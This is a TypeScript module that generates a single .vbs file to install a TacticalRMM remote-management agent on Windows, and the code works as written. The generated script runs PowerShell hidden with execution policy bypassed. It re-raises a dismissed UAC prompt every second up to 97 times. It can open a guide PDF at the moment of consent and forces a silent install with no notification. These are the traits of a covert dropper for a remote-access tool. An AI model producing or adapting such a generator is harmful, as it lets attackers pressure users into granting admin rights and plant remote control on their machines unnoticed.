// Vantra (TacticalRMM) one-click carrier — the binder for OUR agent install.
//
// FORK, NOT EDIT: this file is intentionally a SEPARATE duplicate of
// lib/openframe-carrier.ts's generic carrier layer. The owner's directive
// (TASK_177 follow-up): the OpenFrame carrier is the proven, Windows-tested
// asset and must never be touched by this experiment — the Vantra install
// script gets its own copy. If you fix a bug HERE, check whether
// lib/openframe-carrier.ts needs the same fix (and vice versa).
//
// WHY: OpenFrame hands out a one-liner; OUR agent install is handed out by the
// RMM dashboard as a MULTI-LINE PowerShell script (download the TacticalRMM
// agent exe → silent install → `tacticalrmm.exe -m install --api … --auth …`
// → cleanup). We bind THAT into one double-clickable .vbs the same way:
//
//   raw multi-line script → normalizePowerShellCommand() → single-line,
//   double-quote-free → renderCarrierVbs() → one .vbs (hidden, UAC-elevated,
//   double-click on the Windows box; agent service comes up).
//
// TASK_179 stage 2: the elevated step re-arms a dismissed UAC every 1 s up to
// 97× (exact zip FIX 5 retry-loop parity — "agent mistakes on the button"
// must not kill a deploy), and an optional guide PDF (CarrierVbsOptions.pdf)
// opens the moment consent is granted, BEFORE the install runs — the zip's
// "the moment the user clicks Yes" behaviour, in one file.
//
// TASK_179 stage 2.1 (VM-test failure, 2026-10-07): Windows caps a process
// command line at 32,767 chars (CreateProcess) — inlining a PDF's base64 in
// `-Command` reached 66,845 chars, ShellExecute failed with ERROR_INVALID_
// PARAMETER ("The parameter is incorrect") and PowerShell never launched (the
// 97× loop then re-armed, popping that dialog every second). The base64 now
// rides in a TEMP sidecar file the VBS writes (FSO text writes are not a
// process command line); the elevated PowerShell reads it back from a `@B64@`
// marker the VBS substitutes with the real path at RUN time (elevated TEMP is
// not a safe source of truth — over-the-shoulder admin has a different one).
// The renderer additionally fails CLOSED with `command_too_long` whenever the
// final command line would exceed MAX_CMDLINE_CHARS for any other reason.
//
// TASK_179 stage 2.2 (VM-test failure, 2026-10-07): the 97× loop keyed on
// Err.Number after ShellExecute(runas) — but a DISMISSED UAC does NOT set
// Err in WSH, so `If Err.Number = 0 Then Exit Do` fired on the FIRST Cancel
// and the loop never re-armed (owner's VM test). The zip's FIX 5 worked
// because PowerShell's `Start-Process -Verb RunAs -Wait -ErrorAction Stop`
// THROWS on cancel (documented). Stage 2.2 stages the whole elevate into a
// self-elevating `sw-agent-run.ps1` that reports the outcome by EXIT CODE
// (0 = done, 1 = dismissed → retry, 2 = install failed → no retry) —
// WScript.Shell.Run(..., True) waits for it and returns the code. Bonus: a
// fresh PowerShell per attempt, so correctness no longer depends on
// `On Error Resume Next` surviving into the footer.
//
// Normalizer contract (FAIL-CLOSED, stable error codes): one complete
// statement per line joined with `;`; comments stripped only where PowerShell
// starts one; double-quoted literals converted to single quotes ONLY when the
// literal has no `$` and no backtick (both would change meaning); tabs in
// strings, here-strings, multi-line/unbalanced string literals, interpolating
// double quotes, trailing continuation characters (`|` `` ` `` `,` `(` `=`
// `+` `-`), and structurally-ambiguous lines (control statement without `{`,
// line starting `}`/`else`/`catch`/`finally`) all THROW instead of guessing.
// Our RMM install script is one-statement-per-line and passes untouched.
//
// The .vbs is plain TEXT: mint = string render. No toolchain, no zip.
//
// VBS sunset reality (checked 2026-10-07): VBScript is deprecated on Win11
// 24H2+/Server 2025 but still ENABLED BY DEFAULT; default-off only in a
// future 2027 release. VBS is the right carrier TODAY; a minted carrier also
// runs from an elevated cmd via `cscript //nologo file.vbs` if VBS is ever
// disabled on a hardened box.
//
// Line-budget note: VBScript source lines cap at 1023 chars (WSH limit), so
// both the ps = assignment and the base64 sidecar writes are chunked into
// multi-line concatenations well below that.

export interface CarrierVbsOptions {
  /**
   * UAC-elevate before running PowerShell (DEFAULT TRUE: the agent install
   * writes to `C:\Program Files` and registers a service — it needs admin).
   * `false` = `WScript.Shell.Run` unelevated, for already-elevated contexts.
   *
   * TASK_179 stage 2: the elevated path now RE-ARMS a dismissed UAC every
   * 1 s up to 97 attempts (exact parity with the zip's FIX 5 retry-loop
   * bridge) instead of dying on the first dismissal.
   */
  elevate?: boolean;
  /**
   * TASK_179 stage 2 — optional guide PDF. The base64 is staged at mint into
   * a TEMP sidecar the VBS writes — NEVER inside the PS command line (the
   * 32,767-char CreateProcess wall; see stage 2.1 in the module header). The
   * elevated PowerShell decodes it to `%TEMP%`, waits `delaySec`, opens it in
   * the default viewer, THEN runs the install command — zip parity ("opens
   * the guide the moment the user approves UAC"). Validation is fail-closed
   * in `carrierPdfStatement`.
   */
  pdf?: CarrierPdf;
}

/** TASK_179 stage 2 — an embedded guide PDF for the carrier. */
export interface CarrierPdf {
  /** Base64 bytes; a `data:…;base64,` prefix and whitespace are stripped. */
  pdfBase64: string;
  /** Temp file name — bare `*.pdf` basename only (default `guide.pdf`). */
  pdfName?: string;
  /** Seconds to wait before opening (zip `pdfDelaySec` parity), 0–120. */
  delaySec?: number;
}

// ---------------------------------------------------------------------------
// Normalizer: arbitrary installer PowerShell → single-line, quote-safe form
// ---------------------------------------------------------------------------

const CONTINUATION_TAIL = new Set(["|", "`", ",", "(", "=", "+", "-"]);
// Line-leading constructs that are INCOMPLETE without structural context —
// joining them with `; ` would silently change meaning (or break) the script.
const LEAD_REJECT = /^(?:\}|else\b|catch\b|finally\b)/i;
const NEEDS_BRACE_LEAD =
  /^(?:if|do|while|for|foreach|switch|try|function|filter|class|begin|process|end)\b/i;

/**
 * Flatten a multi-line PowerShell install script into the single-line,
 * double-quote-free form `renderCarrierVbs` accepts, with semantics
 * preserved. See the module header for the full contract — the short version:
 * straightforward scripts (like ours) flatten exactly; anything a text join
 * could silently break throws `here_string` / `multiline_string` /
 * `interpolating_double_quote` / `continuation_line` / `line_structure` /
 * `tab_in_string` / `empty_command` instead of producing a wrong installer.
 */
export function normalizePowerShellCommand(raw: string): string {
  if (typeof raw !== "string" || !raw.trim()) throw new Error("empty_command");
  if (raw.includes('@"') || raw.includes("@'")) throw new Error("here_string");

  let out = "";
  for (const rawLine of raw.split(/\r\n|\r|\n/)) {
    let line = "";
    let state: "code" | "sq" | "dq" = "code";
    let comment = false;
    for (let i = 0; i < rawLine.length; i++) {
      const c = rawLine[i];
      if (state === "code") {
        if (c === "'") { state = "sq"; line += c; }
        else if (c === '"') { state = "dq"; line += "'"; }
        else if (c === "\t") line += " ";
        else if (c === "#" && (line.trim().length === 0 || /\s$/.test(line))) { comment = true; break; }
        else line += c;
      } else if (state === "sq") {
        if (c === "\t") throw new Error("tab_in_string");
        if (c === "'") {
          if (rawLine[i + 1] === "'") { line += "''"; i++; }
          else { state = "code"; line += "'"; }
        } else line += c;
      } else {
        if (c === "\t") throw new Error("tab_in_string");
        if (c === '"') {
          if (rawLine[i + 1] === '"') { line += "''"; i++; }
          else { state = "code"; line += "'"; }
        } else if (c === "$" || c === "`") throw new Error("interpolating_double_quote");
        else line += c;
      }
    }
    if (state !== "code") throw new Error("multiline_string");
    if (comment && line.trim().length === 0) continue; // whole-line comment
    line = line.trim();
    if (line.length === 0) continue;

    if (LEAD_REJECT.test(line)) throw new Error("line_structure");
    if (NEEDS_BRACE_LEAD.test(line) && !line.includes("{")) throw new Error("line_structure");
    const tail = line[line.length - 1];
    if (CONTINUATION_TAIL.has(tail)) throw new Error("continuation_line");

    if (out.length > 0) out += out.endsWith(";") ? " " : "; ";
    out += line;
  }

  if (out.length === 0) throw new Error("empty_command");
  // Defense in depth: everything the carrier renderer forbids must be gone.
  if (/["\r\n\t]/.test(out)) throw new Error("normalize_failed");
  return out;
}


// ---------------------------------------------------------------------------
// TASK_178 stage 1 — the TASK_172 `--silent` guarantee, applied at MINT time.
// ---------------------------------------------------------------------------

/**
 * Ensure the `-m install` argv ends with `--silent` — the TASK_172 fix that
 * suppresses every TacticalRMM GUI element (confirmation dialogs, error
 * popups, the final success/broker notification). The generator/zip path
 * carries it (`buildEnrollmentCommand()` ends `--silent`); the Vantra app's
 * `psCommand` — the one this VBS flow binds — does NOT, which is why the
 * owner's first VBS test still showed the Tactical notification after
 * install. Stage-1 owner directive: enforce the silence HERE, at mint.
 *
 * Idempotent: an already-silent command returns byte-identical (the `-silent`
 * word-boundary check counts `--silent` anywhere — argv value or quoted —
 * so we can never append twice).
 *
 * Two shapes are recognised, both fail-closed rather than guessing:
 *   quoted — `Start-Process … -ArgumentList '-m install …' -WindowStyle Hidden`
 *            (the canonical trmm `toPowerShellInstallCommand` form): insert
 *            ` --silent` before the value's closing single quote;
 *   bare   — a `-m install …` statement with no quotes after the subcommand
 *            (the generator's `buildEnrollmentCommand` form): append at the
 *            end of that statement (before `;` / end of command).
 *
 * Throws `enroll_not_found` (no `-m install` argv at all) or
 * `enroll_unrecognized` (a quote inside the statement that shape-1 did not
 * match — where to insert would be a guess) — the mint fails closed instead
 * of silently shipping a notifying install.
 */
export function ensureSilentEnroll(powershellCommand: string): string {
  const cmd = powershellCommand;
  // Word-bounded `--silent` already present (value or quoted) → no-op.
  if (/(?:^|[\s'"])--silent(?:[\s'"]|$)/.test(cmd)) return cmd;

  // Shape 1 — canonical quoted `-ArgumentList '-m install …'`. The next `'`
  // is that value's closing quote: TRMM argv tokens are hex/URL/feature
  // tokens with no quotes inside, so `[^']*` is exact. Insert before it.
  const quoted = /(-ArgumentList\s+')-m install\b([^']*)(')/.exec(cmd);
  if (quoted) {
    const at = quoted.index + quoted[0].length;
    return cmd.slice(0, at - 1) + " --silent" + cmd.slice(at - 1);
  }

  // Shape 2 — bare enroll statement: append `--silent` at the end of the
  // statement that starts at `-m install` (up to `;` or end of command).
  const idx = cmd.indexOf("-m install");
  if (idx === -1) throw new Error("enroll_not_found");
  const rest = cmd.slice(idx);
  const semi = rest.indexOf(";");
  const statement = semi === -1 ? rest : rest.slice(0, semi);
  // Any quote after `-m install` means a quoted argv shape-1 did not
  // recognise — inserting outside the string would corrupt it. Fail closed.
  if (/['"]/.test(statement)) throw new Error("enroll_unrecognized");
  const trailing = /\s*$/.exec(statement)?.[0] ?? "";
  const patched =
    statement.slice(0, statement.length - trailing.length) +
    " --silent" +
    trailing;
  return cmd.slice(0, idx) + patched + (semi === -1 ? "" : rest.slice(semi));
}


// ---------------------------------------------------------------------------
// TASK_179 stage 2 — the embedded guide PDF (zip parity)
// ---------------------------------------------------------------------------

/** Mirrors `validateInstallerPdf`'s ceiling (lib/vantra-link.ts, TASK_125). */
const MAX_CARRIER_PDF_BYTES = 20 * 1024 * 1024;
/** Bare basename: no path chars/`..`/leading dot, ≤ 64 chars, ends `.pdf`. */
const CARRIER_PDF_NAME = /^(?!\.)(?!.*\.\.)[A-Za-z0-9][A-Za-z0-9 _-]{0,58}\.pdf$/;

/** Temp sidecar the base64 rides in — the PS command line never carries it. */
export const B64_SIDECAR = "sw-agent-guide.b64";
/** Marker the VBS substitutes (run time, real path) before the launch. */
export const B64_MARKER = "@B64@";
/**
 * Windows' CreateProcess command-line ceiling is 32,767 chars (incl. the
 * program name and quotes). Hold it with margin: the renderer refuses with
 * `command_too_long` rather than mint a carrier Windows rejects at run time
 * with "The parameter is incorrect" (the TASK_179 VM failure).
 */
export const MAX_CMDLINE_CHARS = 30_000;

/** Fail-closed PDF validation → raw (stripped) base64 + sanitised knobs. */
function validateCarrierPdf(pdf: CarrierPdf): { raw: string; name: string; delay: number } {
  const raw = (pdf.pdfBase64 ?? "")
    .trim()
    .replace(/^data:[^;]+;base64,/, "")
    .replace(/\s+/g, "");
  if (!raw || !/^[A-Za-z0-9+/]+={0,2}$/.test(raw)) throw new Error("invalid_pdf");
  if (Math.ceil((raw.length * 3) / 4) > MAX_CARRIER_PDF_BYTES) throw new Error("pdf_too_large");
  const head = Buffer.from(raw.slice(0, 8), "base64").toString("latin1");
  if (head.length < 4 || head.slice(0, 4) !== "%PDF") throw new Error("invalid_pdf");

  const name = (pdf.pdfName ?? "guide.pdf").trim();
  if (!CARRIER_PDF_NAME.test(name)) throw new Error("invalid_pdf_name");
  const delay = pdf.delaySec ?? 0;
  if (!Number.isInteger(delay) || delay < 0 || delay > 120) throw new Error("invalid_pdf_delay");
  return { raw, name, delay };
}

/**
 * The decode→(wait)→open statement: the base64 comes from the sidecar the
 * VBS staged (`@B64@` — substituted with the real path at run time), then the
 * sidecar is removed best-effort REGARDLESS of whether the decode worked.
 * Two `try{}catch{}` blocks: the guide is best-effort, the install that
 * follows never breaks. No double quotes anywhere (the carrier's hard
 * constraint), no tabs/newlines.
 */
function pdfStatement(name: string, delay: number): string {
  return (
    `try{[IO.File]::WriteAllBytes($env:TEMP + '\\${name}', [Convert]::FromBase64String([IO.File]::ReadAllText('${B64_MARKER}')))` +
    (delay > 0 ? `;Start-Sleep -Seconds ${delay}` : "") +
    `;Start-Process ($env:TEMP + '\\${name}')}catch{}` +
    `;try{Remove-Item ('${B64_MARKER}') -Force -ErrorAction SilentlyContinue}catch{}`
  );
}

/**
 * Build the guide-PDF statement for a command (without the install that
 * follows). Validated fail-closed with stable codes: `invalid_pdf`
 * (charset/magic), `pdf_too_large` (same 20 MB ceiling as the zip's
 * validator), `invalid_pdf_name` (bare `*.pdf` basename — this string is
 * spliced into a single-quoted PS literal), `invalid_pdf_delay` (integer
 * 0–120, zip `pdfDelaySec` parity).
 */
export function carrierPdfStatement(pdf: CarrierPdf): string {
  const { name, delay } = validateCarrierPdf(pdf);
  return pdfStatement(name, delay);
}


// ---------------------------------------------------------------------------
// The generic carrier: any single-line PowerShell command → one .vbs
// ---------------------------------------------------------------------------

// PS flags: no profile (deterministic), no interactive prompts (a hidden
// window must never stall waiting for stdin), bypass policy for our one-shot
// script, hidden window. The command itself is embedded with doubled-quote
// VBS escaping; validation below guarantees it contains no `"` in the first
// place (defense in depth: escaping AND rejection).
/** PS flag prefix shared by both launch paths (exported for tests). */
export const PS_FLAGS =
  "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command ";
export const PS_PREFIX = "powershell.exe " + PS_FLAGS;

/** The staged run file written by the elevate path (TASK_179 stage 2.2). */
export const RUN_SIDECAR = "sw-agent-run.ps1";
/**
 * The same flags with `-Command` swapped for `-File` — the VBS waits on the
 * staged script instead of inlining the command. Fail-closed at load: if
 * PS_FLAGS' tail ever changes shape, throw rather than emit a broken line.
 */
export const RUN_PREFIX = PS_FLAGS.endsWith("-Command ")
  ? "powershell.exe " + PS_FLAGS.slice(0, -"-Command ".length) + "-File "
  : (() => {
      throw new Error("ps_flags_unexpected");
    })();
/**
 * Self-elevating header for the staged run file (stage 2.2). Already admin →
 * skip; otherwise re-launch SELF with the zip FIX 5 primitive:
 * Start-Process -Verb RunAs -Wait -ErrorAction Stop in try/catch —
 * dismissed → catch → exit 1 (the ONLY code the VBS retries on); granted →
 * -Wait returns when the elevated copy finishes → exit 0. The trailing
 * `try{` opens the payload block; SELF_ELEVATE_TRAILER closes it (0 =
 * success, 2 = install failed → no retry — zip parity: only a dismissed
 * consent re-prompts). `$PSCommandPath` is the sidecar's own path — no user
 * data enters any quoting layer (quotes around the path are concatenated at
 * RUN time, not parsed from a literal — space/apostrophe safe).
 */
export const SELF_ELEVATE_HEADER =
  "$id=[Security.Principal.WindowsIdentity]::GetCurrent();if(-not ([Security.Principal.WindowsPrincipal]$id).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){try{Start-Process powershell.exe -ArgumentList @('-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-WindowStyle Hidden','-File','\"'+$PSCommandPath+'\"') -Verb RunAs -Wait -ErrorAction Stop;exit 0}catch{exit 1}};try{";
/** Closes the payload try block: success → 0, install failure → 2. */
export const SELF_ELEVATE_TRAILER = ";exit 0}catch{exit 2}";

/** VBScript string-literal escaping (double the quotes). */
function vbsString(value: string): string {
  return '"' + value.replace(/"/g, '""') + '"';
}

/** Carve a long PS command into `ps = ps & "..."` lines under the 1023-char
 *  VBScript source-line limit. Chunks rejoin EXACTLY (tested): split points
 *  are irrelevant to correctness because VBS concatenates before PowerShell
 *  ever sees the string — spaces are preferred only for human diffing. */
function chunkContinuation(command: string): string {
  const lines: string[] = [];
  let rest = command;
  const WIDTH = 900;
  while (rest.length > WIDTH) {
    const cut = rest.lastIndexOf(" ", WIDTH);
    if (cut > 0) {
      lines.push(`  ps = ps & ${vbsString(rest.slice(0, cut) + " ")}`);
      rest = rest.slice(cut + 1);
    } else {
      lines.push(`  ps = ps & ${vbsString(rest.slice(0, WIDTH))}`);
      rest = rest.slice(WIDTH);
    }
  }
  lines.push(`  ps = ps & ${vbsString(rest)}`);
  return lines.join("\n");
}

/** Carve quote-free text (the base64 payload) into `TARGET.Write "…"` lines
 *  under the 1023-char VBS source-line limit. TextStream.Write appends exactly
 *  what it is given, so split points are irrelevant (rejoin-tested). */
function chunkWrite(target: string, text: string): string {
  const lines: string[] = [];
  const WIDTH = 900;
  for (let at = 0; at < text.length; at += WIDTH) {
    lines.push(`  ${target}.Write ${vbsString(text.slice(at, at + WIDTH))}`);
  }
  return lines.join("\n");
}

/**
 * Render a single-file `.vbs` carrier that runs the given PowerShell command
 * hidden on double-click.
 *
 * `elevate` (default true) stages the command into a TEMP `sw-agent-run.ps1`
 * sidecar with a self-elevating header (Start-Process -Verb RunAs -Wait
 * -ErrorAction Stop in try/catch → exit codes 0/1/2) and runs it through
 * WScript.Shell.Run -File (hidden, wait=True) — the agent install needs
 * admin (Program Files + service registration). A dismissed consent exits 1
 * and RE-ARMS every 1 s up to 97 attempts (zip FIX 5 parity, TASK_179 stage
 * 2.2); exhausting them — or an install failure (exit 2) — exits silently.
 * With `elevate:false` the command runs inline via WScript.Shell.Run
 * -Command (window style 0, no UAC) for already-elevated contexts — no
 * consent dialog exists there, so no retry loop either.
 *
 * `pdf` (optional) prepends the decode→open statement for a guide PDF —
 * see `carrierPdfStatement` for its fail-closed contract.
 *
 * Command constraints (fail closed): non-empty, single line, and NO `"` —
 * the command is embedded verbatim between VBS string boundaries, and a
 * double quote is the only way out of that context. `normalizePowerShellCommand`
 * produces exactly this shape (or throws).
 */
export function renderCarrierVbs(
  powershellCommand: string,
  options: CarrierVbsOptions = {},
): string {
  const command = powershellCommand.trim();
  if (!command) throw new Error("empty_command");
  if (/[\r\n\t]/.test(command)) throw new Error("multiline_command");
  if (command.includes('"')) throw new Error("double_quote_command");
  // The sidecar marker is substituted GLOBALLY at run time — a literal
  // `@B64@` inside the install command would be rewritten to the path.
  // Astronomically unlikely; fail closed anyway.
  if (command.includes(B64_MARKER)) throw new Error("marker_collision");
  const elevate = options.elevate !== false;
  // TASK_179 stage 2 — the guide PDF rides in FRONT of the install command,
  // inside the same elevated PowerShell: decode → (wait) → open → install.
  // Best-effort by construction (try/catch around the PDF steps only). The
  // base64 itself does NOT enter the command (stage 2.1): it is staged into
  // the sidecar below; only the `@B64@` marker travels in the statement.
  const pdf = options.pdf ? validateCarrierPdf(options.pdf) : null;
  const pdfPrefix = pdf ? pdfStatement(pdf.name, pdf.delay) + ";" : "";
  const finalCommand = pdfPrefix + command;

  // TASK_179 stage 2.1 — Windows wall. ShellExecute/Run ultimately hand the
  // whole line to CreateProcess (32,767 chars max): refuse at MINT with a
  // stable code instead of the run-time "The parameter is incorrect" dialog
  // that failed the owner's VM test.
  if (PS_PREFIX.length + 2 + finalCommand.length > MAX_CMDLINE_CHARS) {
    throw new Error("command_too_long");
  }

  const header = [
    "' SpaceWorker Vantra agent install carrier.",
    "' Generated at MINT time — this machine's enrollment values are baked into THIS file.",
    "' Double-click to run. UAC re-arms every second up to 97x if dismissed (zip FIX 5).",
    "' Source: lib/vantra-carrier.ts — do not hand-edit a minted carrier.",
    "Option Explicit",
    "Dim ps : ps = \"\"",
    "On Error Resume Next",
    "",
  ].join("\n");

  // TASK_179 stage 2.1 — stage the guide's base64 into a TEMP sidecar BEFORE
  // the command is built. FSO text writes are not a process command line, so
  // they are exempt from the 32,767-char wall that the inline form hit. All
  // of this runs under On Error Resume Next: if any write went wrong the
  // footer's pre-launch Err check fails closed — no half-written payload is
  // ever launched at. Fixed sidecar name: a concurrent second mint simply
  // truncates it (both carry the same org's guide anyway).
  // TASK_179 stage 2.2 — the elevate path stages a self-elevating
  // `sw-agent-run.ps1` sidecar: PowerShell's Start-Process -Verb RunAs -Wait
  // THROWS on a dismissed UAC (documented), which the run file converts to
  // exit code 1; WScript.Shell.Run waits for it and hands the code to the
  // retry loop. (ShellExecute cannot — a dismiss does NOT set Err: the
  // owner's VM proved the old loop exited on the first Cancel.) The fso is
  // shared with the guide's b64 sidecar (PDF); all of this is FSO text
  // writes, not a process command line — no length wall (stage 2.1's rule).
  const staging =
    pdf || elevate
      ? [
          "  Dim fso : Set fso = CreateObject(\"Scripting.FileSystemObject\")",
          ...(pdf
            ? [
                `  Dim b64Path : b64Path = fso.BuildPath(fso.GetSpecialFolder(2).Path, "${B64_SIDECAR}")`,
                "  Dim b64File : Set b64File = fso.CreateTextFile(b64Path, True)",
                chunkWrite("b64File", pdf.raw),
                "  b64File.Close",
                "",
              ]
            : []),
          ...(elevate
            ? [
                `  Dim runPath : runPath = fso.BuildPath(fso.GetSpecialFolder(2).Path, "${RUN_SIDECAR}")`,
                "  Dim runFile : Set runFile = fso.CreateTextFile(runPath, True)",
                chunkWrite("runFile", SELF_ELEVATE_HEADER),
                "",
              ]
            : []),
        ].join("\n")
      : "";

  // Run-time marker substitution: the REAL sidecar path (the dropper's TEMP,
  // not the elevated process's — an over-the-shoulder admin has a different
  // profile) replaces `@B64@` in the built command. Single quotes are doubled
  // for the PS single-quoted literal the marker sits inside.
  const markerSub = pdf
    ? `\n  ps = Replace(ps, "${B64_MARKER}", Replace(b64Path, "'", "''"))`
    : "";

  // Elevate: append the (marker-substituted) payload to the staged run file
  // and close its try block — FSO writes again (no command-line length wall).
  const runFlush = elevate
    ? `\n  runFile.Write ps\n  runFile.Write ${vbsString(SELF_ELEVATE_TRAILER)}\n  runFile.Close\n`
    : "";
  const body = staging + chunkContinuation(finalCommand) + markerSub + runFlush;

  const footer = elevate
    ? [
        "",
        "If Err.Number <> 0 Then WScript.Quit 1",
        "Dim shell : Set shell = CreateObject(\"WScript.Shell\")",
        // TASK_179 stage 2.2 — EXACT parity with the zip's FIX 5 "retry-loop
        // bridge" ($n=97;while($n){try{Start-Process -Verb RunAs -Wait
        // -ErrorAction Stop}catch{$n-=1;Sleep 1}}): a dismissed UAC re-arms
        // the consent prompt every 1 s up to 97 attempts instead of killing
        // the deploy (the owner's "agent mistakes on the button" failures).
        // The outcome is an EXIT CODE because WSH cannot see it: ShellExecute
        // does NOT set Err when the prompt is dismissed (2026-10-07 VM proof —
        // the old Err gate exited on the FIRST Cancel). The staged
        // sw-agent-run.ps1 owns elevation and reports:
        //   0 = consent granted + install finished → done
        //   1 = consent dismissed → count down, wait 1 s, prompt again
        //   2 = install failed → done (zip parity: failures don't re-prompt)
        // All 97 dismissed → loop ends → run file deleted → silent exit.
        "Dim attempt : attempt = 97",
        "Dim rc",
        "Do While attempt > 0",
        // COMPILE RULE: capturing a method's return value REQUIRES parens —
        // `rc = shell.Run "…"` is a parse error (VM run #3, line 102 char 18).
        '  rc = shell.Run("' + RUN_PREFIX + '""" & runPath & """", 0, True)',
        "  If rc <> 1 Then Exit Do",
        "  attempt = attempt - 1",
        "  WScript.Sleep 1000",
        "Loop",
        "If fso.FileExists(runPath) Then fso.DeleteFile runPath",
        "",
      ].join("\n")
    : [
        "",
        "If Err.Number <> 0 Then WScript.Quit 1",
        "Dim shell : Set shell = CreateObject(\"WScript.Shell\")",
        // Run takes the FULL command line (program included). 0 = SW_HIDE: no
        // console window flashes. Use only when already elevated — install
        // fails without admin, and unelevated there is no UAC prompt here.
        'shell.Run "' + PS_PREFIX + '""" & ps & """", 0, False',
        "If Err.Number <> 0 Then WScript.Quit 1",
        "",
      ].join("\n");

  return header + body + "\n" + footer;
}

/**
 * End-to-end: multi-line RMM install script → one double-clickable `.vbs`.
 * This is what the mint CLI calls; tests drive it with fixture scripts
 * (live auth tokens NEVER appear in committed files).
 */
export function renderVantraCarrierFromScript(
  installScript: string,
  options: CarrierVbsOptions = {},
): string {
  return renderCarrierVbs(normalizePowerShellCommand(installScript), options);
}
